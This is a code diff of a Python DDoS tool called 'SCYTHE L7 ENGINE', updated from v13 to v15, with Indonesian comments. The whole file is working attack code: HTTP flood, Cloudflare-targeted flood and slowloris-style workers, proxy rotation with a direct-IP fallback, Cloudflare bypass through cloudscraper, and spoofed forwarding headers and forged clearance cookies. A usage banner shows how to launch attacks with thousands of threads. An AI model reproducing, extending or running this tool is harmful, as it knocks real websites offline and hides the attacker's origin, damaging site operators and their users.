@@ -2,18 +2,18 @@
 # -*- coding: utf-8 -*-
 """
 ╔═══════════════════════════════════════════════════════════════════════════════╗
-║  SCYTHE L7 ENGINE v13.0 — DIRECT FALLBACK + SMART RETRY                    ║
-║  🔥 httpbypass, cf-flood, slow, httpget, httpflood, auto                   ║
-║  🔥 PROXY: support user:pass@host:port, timeout 10s                        ║
-║  🔥 DIRECT FALLBACK: jika semua proxy mati, pakai IP VPS langsung          ║
-║  🔥 SMART RETRY: hanya retry untuk error sementara                         ║
-║  🔥 ERROR LOG: dibatasi 20 error per detik (tidak banjir)                  ║
+║  SCYTHE L7 ENGINE v15.0 — PROFESSIONAL (MHDDOS-STYLE)                       ║
+║  🔥 6 METODE: httpbypass, cf-flood, slow, httpget, httpflood, auto         ║
+║  🔥 Engine: requests + PyRoxy + cloudscraper                                ║
+║  🔥 Proxy: support HTTP, HTTPS, SOCKS4, SOCKS5                             ║
+║  🔥 Session per proxy: 50-100 request, lebih efisien                        ║
+║  🔥 Fallback direct otomatis jika proxy mati                                ║
+║  🔥 Fitur: Cloudflare bypass, header spoofing, random path                 ║
 ╚═══════════════════════════════════════════════════════════════════════════════╝
 """
 import sys
 import os
 import time
-import json
 import random
 import string
 import threading
@@ -22,9 +22,19 @@ import ssl
 import urllib.parse
 import hashlib
 import base64
-from collections import deque
+import json
 
-# ─── Cari proxies.txt ───
+# --- Import library wajib ---
+try:
+    import requests
+    import cloudscraper
+    from PyRoxy import Proxy, ProxyType
+except ImportError as e:
+    print(f"[ERROR] Library missing: {e}")
+    print("Install: pip3 install requests cloudscraper PyRoxy")
+    sys.exit(1)
+
+# --- Fungsi cari proxy file ---
 def find_proxy_file(filename="proxies.txt"):
     paths = [
         filename,
@@ -37,14 +47,14 @@ def find_proxy_file(filename="proxies.txt"):
             return os.path.abspath(p)
     return None
 
-# ─── Proxy Manager (dengan auto-reload) ───
+# --- ProxyManager (dengan PyRoxy) ---
 class ProxyManager:
     def __init__(self, proxy_file):
         self.proxy_file = proxy_file
-        self.proxies = []
+        self.proxies = []  # list of Proxy objects from PyRoxy
         self.lock = threading.Lock()
         self.last_reload = 0
-        self.reload_interval = 10  # reload setiap 10 detik
+        self.reload_interval = 15
         self._load()
 
     def _load(self):
@@ -53,7 +63,20 @@ class ProxyManager:
             return
         try:
             with open(self.proxy_file, "r") as f:
-                new_proxies = [l.strip() for l in f if l.strip() and ":" in l and not l.startswith("#")]
+                lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+            new_proxies = []
+            for line in lines:
+                try:
+                    # PyRoxy bisa parse berbagai format
+                    p = Proxy(line)
+                    new_proxies.append(p)
+                except:
+                    # fallback: coba http://ip:port
+                    try:
+                        p = Proxy(f"http://{line}")
+                        new_proxies.append(p)
+                    except:
+                        pass
             with self.lock:
                 self.proxies = new_proxies
                 self.last_reload = time.time()
@@ -63,7 +86,6 @@ class ProxyManager:
             print(f"[PROXY ERROR] {e}", flush=True)
 
     def get(self):
-        # Reload jika perlu
         if time.time() - self.last_reload > self.reload_interval:
             self._load()
         with self.lock:
@@ -75,7 +97,7 @@ class ProxyManager:
         with self.lock:
             return len(self.proxies)
 
-# ─── L7 Engine ───
+# --- L7 Engine ---
 class L7AttackEngine:
     def __init__(self, target, duration, threads, proxy_file=None, method_type="httpbypass"):
         self.target = target
@@ -91,8 +113,9 @@ class L7AttackEngine:
         self.end_time = 0
         self.error_count = 0
         self.error_lock = threading.Lock()
-        self.error_log_limit = 20  # max error per detik
-        self.error_log_time = 0
+        self.error_limit = 30
+        self.error_time = 0
+        self.requests_per_proxy = 50   # 🔥 efisiensi
         self._parse_target()
 
     def _parse_target(self):
@@ -105,14 +128,7 @@ class L7AttackEngine:
         if ':' in self.host:
             self.host = self.host.split(':')[0]
 
-    def _ssl_ctx(self):
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
-        return ctx
-
-    def _headers(self, extra=None):
+    def _headers(self, extra=None, use_cf=False):
         ua = random.choice([
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
@@ -120,9 +136,9 @@ class L7AttackEngine:
         ])
         headers = {
             'User-Agent': ua,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
             'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'fr-FR,fr;q=0.9']),
-            'Accept-Encoding': 'gzip, deflate',
+            'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
             'Cache-Control': 'no-cache',
             'Pragma': 'no-cache',
@@ -131,6 +147,12 @@ class L7AttackEngine:
             headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
         if random.random() > 0.5:
             headers['Referer'] = f"https://{self.host}/"
+        if use_cf:
+            headers['CF-Connecting-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+            headers['CF-IPCountry'] = random.choice(['US', 'ID', 'GB', 'DE', 'FR', 'JP', 'SG', 'NL'])
+            headers['CF-Visitor'] = '{"scheme":"https"}'
+            headers['CF-RAY'] = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
+            headers['Cookie'] = f"__cf_bm={random._urandom(16).hex()}; cf_clearance={random._urandom(32).hex()}"
         if extra:
             headers.update(extra)
         return headers
@@ -147,128 +169,124 @@ class L7AttackEngine:
     def _log_error(self, msg):
         with self.error_lock:
             now = time.time()
-            if now - self.error_log_time > 1:
-                self.error_log_time = now
+            if now - self.error_time > 1:
+                self.error_time = now
                 self.error_count = 0
-            if self.error_count < self.error_log_limit:
+            if self.error_count < self.error_limit:
                 self.error_count += 1
                 print(f"[ERROR] {msg}", flush=True)
 
-    # ─── CORE SEND REQUEST (dengan DIRECT FALLBACK) ───
-    def _send_request(self, proxy=None, method='GET', path=None, body=None, extra_headers=None, retries=2, allow_direct=True):
-        # Coba dengan proxy jika ada
-        if proxy:
-            for attempt in range(retries):
-                sock = None
-                try:
-                    path = path or self._path()
-                    # Parse proxy
-                    proxy_str = proxy
-                    if '://' in proxy_str:
-                        proxy_str = proxy_str.split('://')[-1]
-                    user_pass = None
-                    if '@' in proxy_str:
-                        user_pass, proxy_str = proxy_str.split('@', 1)
-                    p_host, p_port = proxy_str.split(':')
-                    p_port = int(p_port)
+    # --- Core send request menggunakan requests + PyRoxy ---
+    def _send_request(self, proxy_obj=None, method='GET', path=None, body=None, extra_headers=None, retries=2, use_direct_fallback=True):
+        url = f"{self.scheme}://{self.host}{path or self._path()}"
+        headers = self._headers(extra_headers)
+        proxies = None
+        if proxy_obj:
+            # Konversi proxy ke format requests
+            try:
+                proxies = {
+                    'http': proxy_obj.to_url(),
+                    'https': proxy_obj.to_url()
+                }
+            except:
+                # jika gagal, coba string
+                proxies = {
+                    'http': f"http://{proxy_obj}",
+                    'https': f"http://{proxy_obj}"
+                }
+        for attempt in range(retries):
+            try:
+                # Gunakan cloudscraper jika target CF dan tidak ada proxy
+                if 'cloudflare' in self.target.lower() or 'cf' in self.target.lower():
+                    session = cloudscraper.create_scraper()
+                else:
+                    session = requests.Session()
+                if proxies:
+                    session.proxies = proxies
+                session.verify = False
+                session.timeout = 15
+                resp = session.request(
+                    method=method,
+                    url=url,
+                    headers=headers,
+                    allow_redirects=True,
+                    timeout=15
+                )
+                # Sukses walaupun status 4xx/5xx (kita hanya butuh traffic)
+                return True, len(resp.content)
+            except Exception as e:
+                if attempt < retries - 1:
+                    continue
+                # Jika proxy gagal dan fallback direct diizinkan
+                if use_direct_fallback and proxy_obj is not None:
+                    return self._send_request(proxy_obj=None, method=method, path=path, body=body,
+                                              extra_headers=extra_headers, retries=1, use_direct_fallback=False)
+                self._log_error(f"request fail: {e}")
+                return False, 0
+        return False, 0
 
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(10)
-                    sock.connect((p_host, p_port))
-
-                    if self.scheme == 'https':
-                        connect = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
-                        if user_pass:
-                            auth = base64.b64encode(user_pass.encode()).decode()
-                            connect += f"Proxy-Authorization: Basic {auth}\r\n"
-                        connect += "\r\n"
-                        sock.sendall(connect.encode())
-                        resp = sock.recv(1024)
-                        if b'200' not in resp:
-                            sock.close()
-                            continue
-                        sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
-                    else:
-                        # HTTP via proxy (connect langsung)
-                        pass
-
-                    headers = self._headers(extra_headers)
-                    req = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\n"
-                    for k, v in headers.items():
-                        req += f"{k}: {v}\r\n"
-                    if body:
-                        req += f"Content-Length: {len(body)}\r\n"
-                    req += "\r\n"
-                    if body:
-                        req += body
-
-                    sock.sendall(req.encode())
-                    try:
-                        data = sock.recv(4096)
-                        sock.close()
-                        return True, len(data)
-                    except:
-                        sock.close()
-                        return True, 0
-
-                except Exception as e:
-                    if sock:
-                        try: sock.close()
-                        except: pass
-                    # Error sementara, retry
-                    if attempt < retries - 1:
-                        continue
-                    # Jika masih gagal dan allow_direct True, coba direct
-                    if allow_direct:
-                        return self._send_request(proxy=None, method=method, path=path, body=body,
-                                                   extra_headers=extra_headers, retries=1, allow_direct=False)
-                    self._log_error(f"proxy fail: {e}")
-                    return False, 0
-
-        # ─── DIRECT CONNECTION (tanpa proxy) ───
+    # --- Special slow request (pakai socket manual) ---
+    def _send_slow_request(self, proxy_obj=None):
+        # Slowloris: buka koneksi dan kirim header parsial
         sock = None
         try:
-            path = path or self._path()
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(10)
-            sock.connect((self.host, self.port))
-            if self.scheme == 'https':
-                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
-
-            headers = self._headers(extra_headers)
-            req = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\n"
-            for k, v in headers.items():
-                req += f"{k}: {v}\r\n"
-            if body:
-                req += f"Content-Length: {len(body)}\r\n"
-            req += "\r\n"
-            if body:
-                req += body
-
-            sock.sendall(req.encode())
-            try:
-                data = sock.recv(4096)
-                sock.close()
-                return True, len(data)
-            except:
-                sock.close()
-                return True, 0
-
+            if proxy_obj:
+                # Dapatkan host dan port dari proxy
+                proxy_str = str(proxy_obj)
+                if '://' in proxy_str:
+                    proxy_str = proxy_str.split('://')[-1]
+                # parse host:port
+                if '@' in proxy_str:
+                    proxy_str = proxy_str.split('@')[-1]
+                p_host, p_port = proxy_str.split(':')
+                p_port = int(p_port)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(10)
+                sock.connect((p_host, p_port))
+                if self.scheme == 'https':
+                    # CONNECT untuk HTTPS
+                    connect = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
+                    sock.sendall(connect.encode())
+                    resp = sock.recv(1024)
+                    if b'200' not in resp:
+                        sock.close()
+                        return False
+                    # Wrap SSL
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
+            else:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(10)
+                sock.connect((self.host, self.port))
+                if self.scheme == 'https':
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
+            # Kirim request awal (belum selesai)
+            sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
+            # Simpan koneksi untuk dikirim header berkala
+            return True, sock
         except Exception as e:
             if sock:
                 try: sock.close()
                 except: pass
-            self._log_error(f"direct fail: {e}")
-            return False, 0
+            self._log_error(f"slow connect: {e}")
+            return False, None
 
-    # ─── WORKER ───
+    # --- WORKERS (6 metode) ---
+
     def _httpbypass_worker(self):
         end_time = self.end_time
         local_count = 0
         local_bytes = 0
         while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_mgr.get()
+            proxy = self.proxy_mgr.get()
+            for _ in range(self.requests_per_proxy):
+                if not self.running or time.time() >= end_time:
+                    break
                 extra = {
                     'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
                     'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors', 'cors']),
@@ -278,12 +296,12 @@ class L7AttackEngine:
                     extra['Sec-Ch-Ua'] = '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"'
                     extra['Sec-Ch-Ua-Mobile'] = '?0'
                     extra['Sec-Ch-Ua-Platform'] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
-                success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra, retries=2)
+                success, bytes_recv = self._send_request(proxy, extra_headers=extra, retries=1)
                 if success:
                     local_count += 1
                     local_bytes += bytes_recv
-            except Exception as e:
-                self._log_error(f"httpbypass: {e}")
+                else:
+                    break  # proxy mati, pindah
         with self.counter_lock:
             self.total_requests += local_count
             self.total_bytes += local_bytes
@@ -293,22 +311,24 @@ class L7AttackEngine:
         local_count = 0
         local_bytes = 0
         while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_mgr.get()
+            proxy = self.proxy_mgr.get()
+            for _ in range(self.requests_per_proxy):
+                if not self.running or time.time() >= end_time:
+                    break
                 extra = {
-                    'CF-RAY': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                     'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                     'CF-IPCountry': random.choice(['US', 'ID', 'GB', 'DE', 'FR', 'JP', 'SG', 'NL']),
-                    'CF-Visitor': '{"scheme": "https"}',
+                    'CF-Visitor': '{"scheme":"https"}',
+                    'CF-RAY': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                     'CF-Request-ID': hashlib.md5(str(random.random()).encode()).hexdigest()[:32],
                     'Cookie': f"__cf_bm={random._urandom(16).hex()}; cf_clearance={random._urandom(32).hex()}",
                 }
-                success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra, retries=2)
+                success, bytes_recv = self._send_request(proxy, extra_headers=extra, retries=1)
                 if success:
                     local_count += 1
                     local_bytes += bytes_recv
-            except Exception as e:
-                self._log_error(f"cfflood: {e}")
+                else:
+                    break
         with self.counter_lock:
             self.total_requests += local_count
             self.total_bytes += local_bytes
@@ -319,33 +339,17 @@ class L7AttackEngine:
         connections = []
         while self.running and time.time() < end_time:
             try:
+                # Buka koneksi baru jika < 100
                 while len(connections) < 100 and self.running and time.time() < end_time:
                     proxy = self.proxy_mgr.get()
-                    sock = None
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(10)
-                        if proxy:
-                            p_host, p_port = proxy.split(':')
-                            sock.connect((p_host, int(p_port)))
-                            if self.scheme == 'https':
-                                connect = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n\r\n"
-                                sock.sendall(connect.encode())
-                                sock.recv(1024)
-                                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
-                        else:
-                            sock.connect((self.host, self.port))
-                            if self.scheme == 'https':
-                                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
-                        sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
+                    success, sock = self._send_slow_request(proxy)
+                    if success and sock:
                         connections.append({'sock': sock, 'last': time.time()})
                         local_count += 1
-                    except Exception as e:
-                        if sock:
-                            try: sock.close()
-                            except: pass
-                        self._log_error(f"slow connect: {e}")
-
+                    else:
+                        # jika gagal, coba proxy lain
+                        continue
+                # Kirim header parsial untuk koneksi yang sudah ada
                 for conn in connections[:]:
                     if time.time() - conn['last'] > random.randint(8, 15):
                         try:
@@ -371,15 +375,17 @@ class L7AttackEngine:
         local_count = 0
         local_bytes = 0
         while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_mgr.get()
+            proxy = self.proxy_mgr.get()
+            for _ in range(self.requests_per_proxy):
+                if not self.running or time.time() >= end_time:
+                    break
                 path = self._path()
-                success, bytes_recv = self._send_request(proxy=proxy, path=path, retries=2)
+                success, bytes_recv = self._send_request(proxy, path=path, retries=1)
                 if success:
                     local_count += 1
                     local_bytes += bytes_recv
-            except Exception as e:
-                self._log_error(f"httpget: {e}")
+                else:
+                    break
         with self.counter_lock:
             self.total_requests += local_count
             self.total_bytes += local_bytes
@@ -388,60 +394,31 @@ class L7AttackEngine:
         end_time = self.end_time
         local_count = 0
         local_bytes = 0
-        connections = []
-        max_conns = 50
         while self.running and time.time() < end_time:
-            try:
-                while len(connections) < max_conns and self.running:
-                    proxy = self.proxy_mgr.get()
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(10)
-                        if proxy:
-                            p_host, p_port = proxy.split(':')
-                            sock.connect((p_host, int(p_port)))
-                            if self.scheme == 'https':
-                                connect = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n\r\n"
-                                sock.sendall(connect.encode())
-                                sock.recv(1024)
-                                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
-                        else:
-                            sock.connect((self.host, self.port))
-                            if self.scheme == 'https':
-                                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
-                        req = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nConnection: keep-alive\r\n\r\n"
-                        sock.sendall(req.encode())
-                        connections.append({'sock': sock, 'requests': 1})
-                        local_count += 1
-                    except Exception as e:
-                        self._log_error(f"httpflood connect: {e}")
-
-                for conn in connections[:]:
-                    try:
-                        if conn['requests'] < 100:
-                            headers = self._headers()
-                            path = self._path()
-                            req = f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\n"
-                            for k, v in headers.items():
-                                req += f"{k}: {v}\r\n"
-                            req += "Connection: keep-alive\r\n\r\n"
-                            conn['sock'].sendall(req.encode())
-                            conn['requests'] += 1
-                            local_count += 1
-                        else:
-                            conn['sock'].close()
-                            connections.remove(conn)
-                    except:
-                        try: conn['sock'].close()
-                        except: pass
-                        connections.remove(conn)
-                time.sleep(0.01)
-            except Exception as e:
-                self._log_error(f"httpflood outer: {e}")
-
-        for conn in connections:
-            try: conn['sock'].close()
-            except: pass
+            proxy = self.proxy_mgr.get()
+            # Satu proxy untuk satu session
+            session = requests.Session()
+            if proxy:
+                try:
+                    proxy_url = proxy.to_url()
+                    session.proxies = {'http': proxy_url, 'https': proxy_url}
+                except:
+                    pass
+            session.verify = False
+            session.timeout = 15
+            for _ in range(self.requests_per_proxy):
+                if not self.running or time.time() >= end_time:
+                    break
+                try:
+                    headers = self._headers()
+                    path = self._path()
+                    url = f"{self.scheme}://{self.host}{path}"
+                    resp = session.get(url, headers=headers, allow_redirects=True, timeout=15)
+                    local_count += 1
+                    local_bytes += len(resp.content)
+                except:
+                    break
+            session.close()
         with self.counter_lock:
             self.total_requests += local_count
             self.total_bytes += local_bytes
@@ -465,7 +442,7 @@ class L7AttackEngine:
         with self.counter_lock:
             self.total_requests += local_count
 
-    # ─── RPS REPORTER ───
+    # --- RPS Reporter ---
     def _rps_reporter(self):
         last_total = 0
         last_time = time.time()
@@ -480,18 +457,19 @@ class L7AttackEngine:
             last_total = current_total
             last_time = time.time()
 
-    # ─── START ───
+    # --- START ---
     def start(self):
         self.running = True
         self.start_time = time.time()
         self.end_time = self.start_time + self.duration
         proxy_count = self.proxy_mgr.count()
 
-        print(f"\n[Scythe L7 v13.0] {self.method_type.upper()} attack launched", flush=True)
+        print(f"\n[Scythe L7 v15.0] {self.method_type.upper()} attack launched", flush=True)
         print(f"🎯 Target: {self.target}", flush=True)
         print(f"⏱️  Duration: {self.duration}s | Threads: {self.threads} | Proxies: {proxy_count}", flush=True)
+        print(f"🔁 Requests per proxy: {self.requests_per_proxy}", flush=True)
         if proxy_count == 0:
-            print(f"⚠️  No proxies available — using DIRECT connection (your VPS IP)", flush=True)
+            print(f"⚠️  No proxies — using DIRECT connection (your VPS IP)", flush=True)
         print(f"{'='*60}\n", flush=True)
         sys.stdout.flush()
 
@@ -514,15 +492,12 @@ class L7AttackEngine:
             t.start()
             threads.append(t)
 
-        # Monitor early death
         time.sleep(2)
         alive = sum(1 for t in threads if t.is_alive())
         if alive == 0:
-            print(f"[WARN] All threads died! Trying direct connection mode...", flush=True)
-            # Force direct mode by emptying proxies
+            print(f"[WARN] All threads died! Forcing direct mode...", flush=True)
             with self.proxy_mgr.lock:
                 self.proxy_mgr.proxies = []
-            # Restart threads
             for _ in range(self.threads):
                 t = threading.Thread(target=worker_func, daemon=True)
                 t.start()
@@ -552,7 +527,7 @@ class L7AttackEngine:
 if __name__ == '__main__':
     if len(sys.argv) < 4:
         print("\n" + "="*60)
-        print("🔥 SCYTHE L7 ENGINE v13.0 — DIRECT FALLBACK")
+        print("🔥 SCYTHE L7 ENGINE v15.0 — PROFESSIONAL")
         print("="*60)
         print("\nUsage:")
         print("  python3 l7_engine.py <method> <target> <duration> [threads] [proxy_file]")
@@ -562,7 +537,6 @@ if __name__ == '__main__':
         print("\nExamples:")
         print("  python3 l7_engine.py httpbypass example.com 60 500")
         print("  python3 l7_engine.py cf-flood example.com 120 1000")
-        print("  python3 l7_engine.py auto example.com 300 2000")
         print("="*60)
         sys.exit(1)
 
